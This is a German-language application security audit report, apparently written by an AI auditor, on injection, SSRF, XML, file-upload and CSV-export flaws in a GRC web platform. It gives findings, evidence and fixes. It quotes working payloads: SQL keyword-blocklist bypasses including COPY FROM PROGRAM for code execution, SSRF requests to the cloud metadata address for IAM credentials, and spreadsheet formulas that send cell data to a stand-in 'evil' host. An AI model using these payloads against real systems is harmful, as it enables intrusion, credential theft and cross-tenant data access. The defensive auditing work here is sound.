# S04 — Input-Validierung, Injection, XML, Datei-Upload, SSRF

**Audit-ID:** ARCTOS-FULL-2026-08-31 · **Stream:** S04 · **Repo:** `/work/repo` @ `a8d1414f`
**Auditor:** Claude Opus 5 · **Stand:** fortlaufend

---

## 1. Zusammenfassung

Der Stream deckt alle Eintrittspunkte nicht vertrauenswürdiger Daten ab: Zod-Deckungsgrad über
alle 1.357 Routen (maschinell), SQL-Injection, XML/XXE (empirisch getestet), Datei-Upload,
SSRF, Formula-Injection, Deserialisierung/Prototype-Pollution und ReDoS.

**Kernbefunde:**

- **S04-01 (Critical):** Der Worker führt „custom_sql"-Regeln der _Continuous-Audit_-Funktion
  über `sql.raw(\`SET LOCAL statement_timeout='60s'; ${query}\`)`**als DB-Superuser`grc`
(BYPASSRLS)** aus. Die einzige Kontrolle ist ein Keyword-Blocklist (`isReadOnlySql`), der
trivial umgangen wird (`SELECT INTO`, `DO $$…$$`, `COPY … FROM PROGRAM`, `GRANT`, `;`-Multi-
  Statement). Empirisch belegt: multi-statement DML wird ausgeführt. → beliebiges SQL, RCE-fähig,
  Cross-Tenant, Audit-Trail-Manipulation.
- **S04-02 / S04-03 (High):** Zwei SSRF-Pfade **ohne** die vorhandene `url-safety`-Kontrolle:
  SAML-Metadaten-/OIDC-Discovery-Fetch (`admin/sso/*`) und der ISMS-Threat-Feed (Worker, Superuser).
  Die im Commit `2ce8d6b8` gefixte Lücke (Playground) und die Webhook-Pfade sind abgesichert —
  **diese Pfade nicht**. Genau der vom Auftrag adressierte „andere Codepfade unrepariert"-Fall.
- **S04-04 (Medium):** XLSX-Dekompressions-/Speicher-Amplifikation: 9,3 MB `.xlsx` → 2,26 GB RSS
  (empirisch). Kein Ratio-/Zeilenlimit, `exceljs` lädt das gesamte Sheet in den Speicher → DoS.
- **S04-05 (Medium):** CSV-Formula-Injection in mehreren Export-Endpunkten (nur RFC-4180-Quote-
  Escaping, keine `=+-@`-Neutralisierung) — obwohl ein `sanitizeCsvValue`-Helfer existiert und
  anderswo genutzt wird.
- Kleinere Findings (S04-06…S04-09) und mehrere **verifiziert-sichere** Pfade (fast-xml-parser v5
  und bpmn-moddle sind gegen XXE/Entity-Expansion empirisch gehärtet; bi-reports/execute ist
  korrekt abgesichert; Import-Executor nutzt Whitelists+parametrisierte Werte).

---

## 2. Methodik-Protokoll (8 Punkte)

1. **Zod-Deckungsgrad (maschinell):** Skript `evidence/S04/zod-coverage.mjs` über alle 1.357
   `route.ts`. Ergebnis: 1.993 exportierte Handler; 739 lesen einen Body, davon **nur 8 ohne
   `.parse/.safeParse`** — und diese 8 sind Multipart-Uploads/Anchor (kein JSON-Body), die eigene
   Prüfungen haben (verifiziert). Body-Validierung ist also faktisch flächendeckend. 405 Handler
   lesen Query-Parameter, 276 davon ohne dediziertes Zod-Schema (→ S04-09, weitgehend kompensiert
   durch `paginate()`-Clamping + Drizzle-Parametrisierung). 107 Handler enthalten `as any`/
   `z.any()`/`.passthrough()` (Stichproben: überwiegend Typ-Casts, kein Validierungs-Bypass).
   Rohdaten: `evidence/S04/zod-coverage-*.json`, `unvalidated-*.txt`, `loose-cast-handlers.txt`.
2. **SQL-Injection:** alle `sql.raw`/Interpolationen enumeriert (`evidence/S04/` implizit via grep).
   Zwei echte dynamische-SQL-Cluster geprüft: Translations (identifier via Whitelist, Werte
   parametrisiert/escaped → sicher, S04-07 nur Muster-Fragilität) und BI/Continuous-Audit (→ S04-01).
   Import-Executor: `VALID_COLUMN_RE` + `ALLOWED_TABLES` + parametrisierte Werte → sicher.
3. **XML/XXE (empirisch):** `bpmn-parser.ts`/`bpmn-validator.ts` nutzen **fast-xml-parser 5.10.1**,
   `bpmn-arctos-parse.ts` nutzt **bpmn-moddle 10.0.0**. Lokale Node-Tests (`/tmp/s04-xml/*`,
   kopiert nach `evidence/S04/`): externe Entities werden von fxp v5 **abgelehnt**
   („External entities are not supported"), Entity-Größe auf 10 000 gedeckelt (Billion-Laughs/
   Quadratic-Blowup abgewehrt). bpmn-moddle expandiert Entities gar nicht (DTD wird als „unparsable"
   verworfen). → **kein XXE, kein Entity-Expansion-DoS**. XLSX-ZIP-Bombe siehe S04-04.
4. **Datei-Upload:** alle 9 `formData()`-Routen gelesen. Größenlimits vorhanden (2 MB–50 MB), MIME-
   Whitelists vorhanden, Pfad-Konstruktion nutzt `randomUUID()` + `orgId`-Präfix + Filename-
   Sanitizing (`/[^a-zA-Z0-9._-]/g`) → kein Traversal. SVG-XSS bei DMS-Download durch
   `octet-stream`+`nosniff`+`attachment` geschlossen (verifiziert). Restfindings: S04-04, S04-06.
5. **SSRF:** alle ausgehenden `fetch`/`axios` mit variabler URL enumeriert. Webhook-Pfade und
   Interface-Health nutzen `checkWebhookUrl`+`checkResolvedHostIsPublic` (DNS-Rebind-Schutz) →
   sicher. Playground-Fix aus `2ce8d6b8` geprüft → **vollständig** (same-origin-Gate ist robust,
   S04-08 nur Rest-Info). Ungeschützt: SAML/OIDC (S04-02), Threat-Feed (S04-03).
6. **Formula-Injection CSV/XLSX:** `sanitizeCsvValue` (neutralisiert führende `=+-@\t\r`) existiert,
   wird aber in mehreren Export-Routen nicht verwendet → S04-05.
7. **Deserialisierung/Prototype-Pollution/eval:** kein `eval`/`new Function`. `mergeTranslation`
   Bracket-Assign geprüft — kein Proto-Pollution (String-Wert, keine Object-Merge-Rekursion).
   `child_process` nur in `claude-cli.ts` via `execFile` (Array-Args, keine Shell) → kein Command-Inj.
8. **ReDoS:** Regex-Bestand gegen Nutzereingaben geprüft; UUID/CSV/URL-Regexe sind linear, keine
   verschachtelten Quantoren auf freiem Input gefunden (kein Finding).

---

## 3. Eintrittspunkt-Inventar (Auszug)

| Klasse            | Ort                                                            | Vertrauensgrenze                      | Kontrolle                   | Bewertung                       |
| ----------------- | -------------------------------------------------------------- | ------------------------------------- | --------------------------- | ------------------------------- |
| JSON-Body         | 739 Handler                                                    | Zod `.parse/.safeParse`               | flächendeckend              | OK (8 Ausnahmen = Uploads)      |
| Query             | 405 Handler                                                    | teils Zod, sonst `paginate()`+Drizzle | 276 ohne Schema             | S04-09 (Low)                    |
| Path-Param (UUID) | dynamische Routen                                              | `requireUuidParam` (opt-in)           | uneinheitlich               | Low, kein SQLi (Drizzle param.) |
| BPMN/DMN-XML      | fast-xml-parser v5 / bpmn-moddle                               | Default-Config                        | ext. Entities aus, Size-Cap | **sicher (getestet)**           |
| CSV/XLSX-Import   | `import/upload`, `processes/import-excel`, `event-logs/upload` | Size+MIME                             | kein Ratio/Row-Cap          | S04-04 (Medium)                 |
| Datei-Upload DMS  | `documents/[id]/upload`                                        | Size+MIME+ClamAV(opt)                 | kein Magic-Byte-Check       | S04-06 (Low)                    |
| Dyn. SQL          | Translations, Import, EAM, BI, Continuous-Audit                | gemischt                              | s. Findings                 | S04-01 / S04-07                 |
| SSRF              | Webhook, Interface-Health                                      | `url-safety`+DNS                      | vorhanden                   | **sicher**                      |
| SSRF              | Playground                                                     | same-origin-Gate                      | vorhanden                   | **sicher** (S04-08 Info)        |
| SSRF              | SAML/OIDC, Threat-Feed                                         | nur `z.url()`                         | **fehlt**                   | S04-02 / S04-03 (High)          |
| CSV-Export        | risks/findings/soa/raci/ropa …                                 | nur Quote-Escape                      | keine `=+-@`-Neutr.         | S04-05 (Medium)                 |

---

## 4. Findings

### S04-01 — Beliebige SQL-Ausführung als Superuser über „Continuous-Audit custom_sql" (RCE-fähig)

**Severity: Critical**
**Dateien:**

- Ausführung: `apps/worker/src/crons/continuous-audit-runner.ts:140`
- Guard: `packages/shared/src/schemas/audit-advanced.ts:219-223`
- Erstellung: `apps/web/src/app/api/v1/audit-mgmt/continuous-rules/route.ts:34-83`
- Worker-DB-Rolle: `docker-compose.production.yml:309-311`

**Wörtliches Zitat (Ausführung, Worker):**

```ts
// continuous-audit-runner.ts:139-141
const rows = await db.execute(
  sql.raw(`SET LOCAL statement_timeout = '60s'; ${query}`),
);
```

`query` = `dataSource.query` aus der Regel-Zeile; keine Laufzeit-Validierung.

**Wörtliches Zitat (Guard, nur bei Erstellung):**

```ts
// audit-advanced.ts:219-222
const WRITE_KEYWORDS = /\b(INSERT|UPDATE|DELETE|DROP|ALTER|TRUNCATE|CREATE)\b/i;
export function isReadOnlySql(query: string): boolean {
  return !WRITE_KEYWORDS.test(query);
}
```

**Wörtliches Zitat (Worker läuft als Superuser):**

```yaml
# docker-compose.production.yml:305-311
# … the worker deliberately connects as the PRIVILEGED superuser `grc` (BYPASSRLS) …
DATABASE_URL: postgresql://grc:${DB_PASSWORD:?…}@postgres:5432/grc_platform
```

**Angriff → Wirkung (belegt):**

1. Rolle `admin`/`auditor` erstellt eine Regel `ruleType:"custom_sql"` mit
   `dataSource.query` = einer der folgenden Nutzlasten. Der Blocklist wird umgangen
   (`evidence/S04/isreadonlysql-bypass.txt`, alle 8 Nutzlasten „PASSES GUARD"):
   - `SELECT * INTO evil_copy FROM organization` (Tabelle anlegen ohne Keyword)
   - `SELECT 1; DO $$ BEGIN EXECUTE 'CRE'||'ATE TABLE …'; EXECUTE 'INS'||'ERT …'; END $$` (beliebiges DDL/DML)
   - `SELECT 1; COPY t FROM PROGRAM 'id'` (**RCE**, als Superuser erlaubt)
   - `SELECT 1; GRANT ALL … TO PUBLIC` (Rechteausweitung)
   - `SELECT * FROM organization` (Cross-Tenant-Read — Superuser umgeht RLS)
   - `SELECT pg_sleep(3600)` (DoS)
2. Der Worker führt sie beim nächsten Schedule aus. Multi-Statement + DML als Superuser
   empirisch bestätigt gegen die laufende DB (`evidence/S04/pg-multistatement-proof.txt`):
   ```
   RESULT: [[],[{"?column?":1}],[{"injected_write_executed":"grc"}]]
   ```
   (das `DO`-Block-`INSERT` lief, `current_user` = `grc`).
3. `PGPASSWORD=… psql -U grc -tAc "SELECT rolsuper,rolbypassrls FROM pg_roles WHERE rolname='grc'"`
   → `t|f` → `grc` ist Superuser (Superuser ⇒ implizit BYPASSRLS + `COPY … FROM PROGRAM`).

**Kompensierende Kontrolle geprüft:** keine wirksame. `isReadOnlySql` ist ein reiner Keyword-
Blocklist und wird nur bei Erstellung geprüft; zur Laufzeit gibt es weder `SET LOCAL ROLE grc_app`
noch `SET TRANSACTION READ ONLY` noch ein `;`-Verbot (anders als das korrekt gehärtete
`bi-reports/queries/execute`, s. „verifiziert-sicher"). Damit ist dies ein Cross-Tenant-,
Audit-Tamper- und RCE-Primitiv für jeden Mandanten-Admin/Auditor.

**Severity-Begründung:** RCE + Cross-Tenant + Manipulierbarkeit des Audit-Trails, alle drei
Critical-Kriterien der Rubrik.

**Fix-Richtung:** Denselben Mechanismus wie `bi-reports/execute` erzwingen — `db.transaction` +
`SET LOCAL ROLE grc_app` + `SET TRANSACTION READ ONLY` + `;`-Verbot + Kommentar-Verbot +
`startsWith("SELECT")` — **zur Laufzeit im Worker**, nicht nur bei Erstellung. Blocklist durch
Allowlist ersetzen; `statement_timeout` in eigenem `execute` setzen statt String-Konkatenation.

---

### S04-02 — SSRF via SAML-Metadaten- und OIDC-Discovery-Fetch (kein url-safety-Guard)

**Severity: High**
**Dateien:**

- `apps/web/src/app/api/v1/admin/sso/metadata/route.ts:20`
- `packages/auth/src/saml/metadata-parser.ts:128-135`
- `apps/web/src/app/api/v1/admin/sso/test/route.ts:77`
- `packages/auth/src/oidc/discovery.ts:11-23`
- Schema: `packages/shared/src/schemas/identity.ts:71-73` (`metadataUrl: z.string().url().max(2000)`)

**Wörtliches Zitat:**

```ts
// metadata-parser.ts:131 (keinerlei Host-/IP-Prüfung vor fetch)
const response = await fetch(metadataUrl, {
  headers: { Accept: "application/xml, text/xml" },
  signal: AbortSignal.timeout(10000),
});
```

```ts
// discovery.ts:20
const response = await fetch(url, { headers: { Accept: "application/json" }, … });
```

**Angriff → Wirkung:** Ein Org-`admin` ruft `POST /api/v1/admin/sso/metadata` mit
`{"metadataUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}` auf.
Die App (im internen Netz) holt die URL und gibt via `parseSAMLMetadata` extrahierte Inhalte
teilweise zurück (`entityId`/`ssoUrl` → partielle Reflexion) — Zugriff auf Cloud-Metadaten
(IAM-Credentials), interne Dienste (`http://postgres:5432`, Admin-Panels), Port-Scan. Analog
`admin/sso/test` → `discoverOIDCEndpoints(config.oidcDiscoveryUrl)`.

**Kompensierende Kontrolle geprüft:** Das Projekt besitzt `checkWebhookUrl` +
`checkResolvedHostIsPublic` (`packages/shared/src/url-safety.ts`, mit DNS-Rebind-Schutz,
Blockierung von 169.254/10./127./IPv6-ULA/Metadaten-Aliasen). Diese werden bei Webhooks und
Interface-Health verwendet, **nicht** in den beiden SSO-Pfaden. `z.string().url()` erlaubt jedes
`http(s)`-Ziel.

**Severity-Begründung:** admin-gated, aber Zugriff auf Cloud-Metadaten = Credential-Theft und
internes Netz vom App-Server aus → High (unvalidierter Input auf sicherheitsrelevantem Pfad).

**Fix:** `checkWebhookUrl(url)` + `await checkResolvedHostIsPublic(hostname)` unmittelbar vor
`fetch` in `fetchAndParseSAMLMetadata` und `discoverOIDCEndpoints`; https erzwingen.

---

### S04-03 — SSRF via ISMS-Threat-Feed-URL (Worker als Superuser, kein Guard)

**Severity: High**
**Dateien:**

- Fetch: `apps/worker/src/crons/threat-feed-sync.ts:133`
- Registrierung: `apps/web/src/app/api/v1/isms/threats/feeds/route.ts:40`
- Schema: `packages/shared/src/schemas/reporting.ts:126-131` (`feedUrl: z.string().url().max(1000)`)

**Wörtliches Zitat:**

```ts
// threat-feed-sync.ts:133 (keine Host-/IP-Prüfung)
const response = await fetch(source.feedUrl, {
  signal: controller.signal,
  headers: {
    "User-Agent": "ARCTOS-ThreatFeedSync/1.0",
    Accept: "application/xml, …",
  },
});
```

**Angriff → Wirkung:** `admin`/`risk_manager` legt via `POST /api/v1/isms/threats/feeds` eine
Quelle mit `feedUrl:"http://169.254.169.254/latest/meta-data/"` (oder `http://postgres:5432`,
internes Dashboard) an. Der Worker — der bewusst als **Superuser im internen Netz** läuft
(vgl. S04-01) — ruft die URL periodisch ab; der Antwort-Body wird geparst und als Threat-Items
gespeichert (→ teilweise exfiltrierbar über die Feed-Item-Liste). Anders als der Webhook-Pfad
gibt es hier **keinen** `checkResolvedHostIsPublic`-Aufruf.

**Kompensierende Kontrolle geprüft:** keine. `interface-health-check.ts:48` nutzt den Guard —
`threat-feed-sync.ts` und `cve-feed-sync.ts` nicht. (cve-feed-sync nutzt eine feste `NVD_API_BASE`-
Env-Konstante, ist also nicht nutzerbeeinflusst → kein Finding.)

**Severity-Begründung:** wie S04-02; zusätzlich Worker im internen Netz mit Superuser-DB-Zugang.

**Fix:** `checkWebhookUrl` + `checkResolvedHostIsPublic` in `feeds`-POST (Registrierung) und in
`threat-feed-sync` unmittelbar vor `fetch`. Redirect-Folge auf `manual`/max 0 begrenzen.

---

### S04-04 — XLSX-Dekompressions-/Speicher-Amplifikation → DoS

**Severity: Medium**
**Dateien:**

- Parser: `apps/web/src/lib/import-export/file-parser.ts:63-114` (`wb.xlsx.load(buffer)` Zeile 71)
- Aufrufer/Limits: `import/upload/route.ts:8` (10 MB), `processes/import-excel/route.ts:47` (10 MB),
  `processes/[id]/event-logs/upload/route.ts:130` (20 MB)

**Wörtliches Zitat:**

```ts
// file-parser.ts:71 — lädt das gesamte Workbook in den Speicher, kein Row-/Ratio-Limit
await wb.xlsx.load(buffer as any);
```

**Angriff → Wirkung (empirisch, `evidence/S04/xlsx-decompression-bomb.txt`):** eine gültige
`.xlsx` mit ~1,85 Mio. Ein-Zellen-Zeilen komprimiert auf **9,3 MB** (unter dem 10-MB-Limit),
Sheet unkomprimiert 134 MB. `wb.xlsx.load` verbraucht **2,26 GB RSS in ~17,5 s**:

```
rows: 1850000  compressed xlsx: 9317413  {"parsedRows":1850001,"elapsedMs":17537,"rssMB":2262,"heapMB":1945}
```

Bei 20 MB (`event-logs`) entsprechend mehr. Eine einzelne Anfrage kann den Web-Prozess per OOM
töten (Container mit 7 GB, mehrere Pods). Kein Streaming, keine Zeilen-Obergrenze vor dem Parsen.

**Kompensierende Kontrolle geprüft:** nur ein Byte-Größenlimit — das die Amplifikation nicht
adressiert (Kompressionsverhältnis ~14–24:1 gemessen). Auth erforderlich (`admin`/`risk_manager`/
`process_owner`), daher nicht anonym, aber Verfügbarkeitsrisiko mit Ausfallpotenzial → Medium.

**Fix:** Streaming-Parser mit harter Zeilen-/Zellen-Obergrenze (z. B. `exceljs` WorkbookReader),
Dekompressionsverhältnis prüfen, Parsen in Worker/mit Speicher-Cap auslagern.

---

### S04-05 — CSV-Formula-Injection in mehreren Export-Endpunkten

**Severity: Medium**
**Dateien (nur Quote-Escaping, keine `=+-@`-Neutralisierung):**

- `apps/web/src/app/api/v1/isms/soa/export/route.ts:68-74` (`csvEscape`)
- `apps/web/src/app/api/v1/risks/export/route.ts:217-223` (`escapeCsvField`)
- `apps/web/src/app/api/v1/findings/export/route.ts` (eigene Escape-Fn, keine Neutralisierung)
- `apps/web/src/app/api/v1/processes/[id]/raci/export/route.ts:86-94` (rohes `join(",")`, gar kein Escape)
- `apps/web/src/app/api/v1/processes/ropa-export/route.ts`, `dpms/ropa/export`, u. a.

**Wörtliches Zitat (typisch):**

```ts
// isms/soa/export/route.ts:68-73 — schützt nur ; " \n, nicht = + - @
function csvEscape(value: string): string {
  if (value.includes(";") || value.includes('"') || value.includes("\n")) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}
```

```ts
// raci/export/route.ts:86 — gar kein Escaping/keine Neutralisierung
return [activity.name, ...cells].join(",");
```

**Angriff → Wirkung:** Ein Nutzer trägt in ein exportiertes Feld (Risiko-Titel, SoA-Begründung,
Prozess-/Aktivitätsname, RACI-Teilnehmername) `=cmd|'/C calc'!A1` bzw.
`=HYPERLINK("http://evil/?"&A1,"x")` ein. Öffnet ein anderer Nutzer/Auditor den Export in
Excel/LibreOffice, wird die Formel ausgewertet (Datenexfiltration, in Altkonfigurationen
Befehlsausführung via DDE). Klassische Formula-Injection.

**Kompensierende Kontrolle geprüft:** Das Projekt hat `sanitizeCsvValue`
(`apps/web/src/lib/import-export/csv-sanitizer.ts:8` und
`packages/shared/src/utils/language-resolver.ts:216`), das führende `=+-@\t\r` mit `'` neutralisiert
und in `import-executor`, `export-engine`, `translations/export` **korrekt** verwendet wird. Die
oben genannten Ad-hoc-Export-Routen nutzen es **nicht** → Inkonsistenz, echtes Risiko.

**Severity-Begründung:** Angriffsvoraussetzung (Opfer öffnet Datei) vorhanden, aber realistischer
GRC-Workflow (Exporte gehen an Auditoren/Management) → Medium.

**Fix:** In allen CSV-Exporten `escapeCsvField(sanitizeCsvValue(x))` verwenden (zentraler Helfer),
Ad-hoc-`csvEscape`/`join(",")` entfernen.

---

### S04-06 — Datei-Upload: MIME-Prüfung vertraut Client-`Content-Type`, kein Magic-Byte-Check

**Severity: Low**
**Datei:** `apps/web/src/app/api/v1/documents/[id]/upload/route.ts:92-97`

**Wörtliches Zitat:**

```ts
if (!ALLOWED_MIMES.has(file.type)) {
  // file.type = vom Client gesetzter Content-Type
  return Response.json(
    { error: `File type not allowed: ${file.type}` },
    { status: 415 },
  );
}
```

`file.type` stammt aus dem Multipart-Header und ist frei wählbar; es erfolgt keine Prüfung der
echten Magic-Bytes. Der gespeicherte `mimeType` (und damit der beim Download ausgelieferte
`Content-Type`) übernimmt den gefälschten Wert.

**Angriff → Wirkung:** Beliebiger Inhalt (z. B. HTML, ausführbare Datei) lässt sich als
`application/pdf` deklariert hochladen. Der ClamAV-Scan ist optional (`CLAMAV_HOST` unset →
`skipped`) und standardmäßig **fail-open** (`CLAMAV_FAIL_CLOSED` nicht gesetzt), fängt außerdem nur
bekannte Signaturen. XSS beim Download ist durch `attachment`+`nosniff`+SVG→`octet-stream`
mitigiert (verifiziert), daher Low — Restrisiko: Malware-Verteilung, falscher `Content-Type`.

**Fix:** Magic-Byte-Erkennung (z. B. `file-type`) gegen die Whitelist, ClamAV per Default
fail-closed in Prod, `mimeType` aus der erkannten Signatur ableiten statt aus dem Header.

---

### S04-07 — Fragiles Roh-SQL mit manuellem Escaping in Translations-Pfaden

**Severity: Low**
**Dateien:** `apps/web/src/app/api/v1/translations/import/route.ts:141-171,305-335`,
`apps/web/src/app/api/v1/translations/ai-translate/route.ts:185-186`,
`apps/web/src/app/api/v1/translations/[entityType]/[entityId]/route.ts:47-57,193-204`

**Wörtliches Zitat:**

```ts
// translations/import/route.ts:168-170 — String-Interpolation in sql.raw
await tx.execute(
  sql.raw(
    `UPDATE "${tableName}" SET "${unit.field}" = '${JSON.stringify(merged).replace(/'/g, "''")}'::jsonb, updated_at = now(), updated_by = '${ctx.userId}' WHERE id = '${unit.entityId}' ${orgFilter}`,
  ),
);
```

**Bewertung:** Aktuell **sicher** — `tableName`/`field` sind über `ENTITY_TABLE_MAP`/
`TRANSLATABLE_FIELDS` allow-listed, `entityId` durch `UUID_RE` geprüft, `orgId`/`userId` sind
Session-UUIDs, der Wert `''`-escaped und `::jsonb`-gecastet. Es ist ein Muster-Risiko: manuelle
Escaping-Logik in `sql.raw` ist ein SQLi-Regressionsrisiko bei jeder künftigen Änderung (der
Kommentar `#CRIT-SEC-XLIFF-SQLI` dokumentiert bereits einen früheren Beinahe-Vorfall).

**Fix:** Auf parametrisierte `sql\`\``-Templates + `sql.identifier()`umstellen;`sql.raw` mit
interpoliertem Nutzerkontext vermeiden.

---

### S04-08 — Playground-SSRF-Fix vollständig; Rest: authentifizierter Same-Origin-Proxy mit Header-Injection

**Severity: Low (Info)**
**Datei:** `apps/web/src/app/api/v1/playground/execute/route.ts:24-31,52-66`

**Prüfung des Fixes aus `2ce8d6b8`:** Der Fix kombiniert (a) Zod-Refine
`p.startsWith("/") && !p.startsWith("//") && !p.includes("\\")` und (b) ein hartes Same-Origin-Gate
`if (targetUrl.origin !== baseUrl) return 422` nach `new URL(path, base)`. Da das Ziel **immer** die
eigene App-Origin ist, greifen DNS-Rebinding, IPv6, Dezimal-/Oktal-IPs, `0.0.0.0` und Metadaten-
Endpunkte nicht (sie erfordern eine off-origin-Host-Auflösung, die das Gate ausschließt).
Backslash-Normalisierung (`/\evil.com`) ist zusätzlich am Refine geblockt. → **Fix ist vollständig**
für die SSRF-zu-beliebigem-Host-Klasse.

**Rest-Beobachtung:** Der Endpunkt (`admin`) leitet beliebige `headers`/`queryParams`/`body` an
same-origin-API-Routen weiter (`fetch(targetUrl, { headers: { ...body.data.headers } })`,
Zeile 71-83). Damit lassen sich Header wie `X-Forwarded-For` (Rate-Limit-/IP-Allowlist-Spoofing)
oder `Authorization` an interne Routen injizieren. Kein SSRF, aber Härtungslücke.

**Fix:** Header-Allowlist (nur `Content-Type` + fachlich nötige), `X-Forwarded-*`/`Cookie`/
`Authorization` verwerfen.

---

### S04-09 — 276 GET-Handler lesen Query-Parameter ohne dediziertes Zod-Schema

**Severity: Low (Info)**
**Evidenz:** `evidence/S04/unvalidated-query-handlers.txt` (maschinell, 276 Einträge).

**Bewertung:** Kein SQLi (alle geprüften Pfade nutzen Drizzle-`eq()`/parametrisiert; `sort`-Werte
via Mapping/Switch, nicht `sql.raw`). `paginate()` (`apps/web/src/lib/api.ts:405-517`) clamped
`limit`/`offset` hart und wirft bei Unbekanntem. Risiko ist daher primär Robustheit/inkonsistente
Validierung (Typ-Koerzion, Filter-Semantik), nicht Sicherheit. Aufgenommen zur Vollständigkeit
und als Härtungsempfehlung (einheitliche Query-Schemas).

---

## 5. Verifiziert-sichere Pfade (Falsch-Positiv-Abgrenzung, dokumentiert)

- **XXE / Entity-Expansion:** fast-xml-parser 5.10.1 lehnt externe Entities ab und deckelt
  Entity-Größe (10 000) — Billion-Laughs/Quadratic-Blowup abgewehrt; bpmn-moddle expandiert keine
  Entities. Empirisch: `evidence/S04/fxp-xxe-results.json`, `moddle-xxe-results.json`. Kein Finding.
- **`bi-reports/queries/execute`:** korrekt gehärtet — `SET LOCAL ROLE grc_app` + `SET TRANSACTION
READ ONLY` + `startsWith("SELECT")` + `;`-Verbot + Kommentar-Verbot, alles in einer Transaktion,
  fail-closed bei fehlender Rolle. Kontrastbeispiel zu S04-01. Kein Finding.
- **Import-Executor:** `VALID_COLUMN_RE` (`^[a-z_][a-z0-9_]*$`) + `ALLOWED_TABLES`-Whitelist +
  parametrisierte Werte. Kein Finding.
- **EAM `portfolio-optimization`/`context-diagram`:** `sql.raw`-Dimensionen aus fester Liste bzw.
  UUIDs aus der DB (`::uuid[]`-Cast), nicht direkt nutzerkontrolliert. Kein Finding.
- **Webhook-Zustellung / Interface-Health:** `checkWebhookUrl` + `checkResolvedHostIsPublic`
  (DNS-Rebind, private/Metadaten-Bereiche) korrekt eingebunden. Kein Finding.
- **Branding-Upload (logo/favicon):** Cross-Tenant-Guard, SVG-Verbot, Zod-Schema. Kein Finding.

---

## 6. Evidenz-Dateien (`/work/audit/evidence/S04/`)

- `zod-coverage.mjs`, `zod-coverage-summary.json`, `zod-coverage-rows.json`,
  `unvalidated-body-handlers.txt`, `unvalidated-query-handlers.txt`, `loose-cast-handlers.txt`
- `fxp-xxe-results.json`, `moddle-xxe-results.json` (XXE-Tests)
- `xlsx-decompression-bomb.txt` (S04-04)
- `isreadonlysql-bypass.txt`, `pg-multistatement-proof.txt` (S04-01)
- Test-Skripte unter `/tmp/s04-xml/` (xxe-test.mjs, moddle-test.mjs, xlsxbomb2.mjs, pg-multi.mjs, blocklist-bypass.mjs)
